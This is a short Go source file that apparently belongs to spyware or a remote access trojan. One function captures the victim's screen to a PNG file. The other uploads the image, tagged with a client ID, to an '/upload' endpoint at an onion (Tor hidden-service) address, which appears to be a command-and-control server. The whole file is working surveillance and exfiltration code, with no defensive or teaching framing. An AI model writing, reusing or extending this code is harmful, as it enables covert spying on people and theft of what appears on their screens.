package pkg

import (
	"bytes"
	"fmt"
	"image/png"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"time"

	screen "github.com/kbinani/screenshot"
)

func MakeScreenShot() (string, error) {
	img, err := screen.CaptureDisplay(0)
	if err != nil {
		return "", err
	}

	filename := fmt.Sprintf("screen_%d.png", time.Now().UnixNano())
	file, _ := os.Create(filename)
	defer file.Close()
	png.Encode(file, img)

	return filename, nil
}

func SendScreenshot(client *http.Client, onionURL, clientID, filename string) error {
	file, _ := os.Open(filename)
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", filename)
	io.Copy(part, file)
	writer.WriteField("client_id", clientID)
	writer.Close()

	req, _ := http.NewRequest("POST", onionURL+"/upload", body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	_, err := client.Do(req)
	return err
}
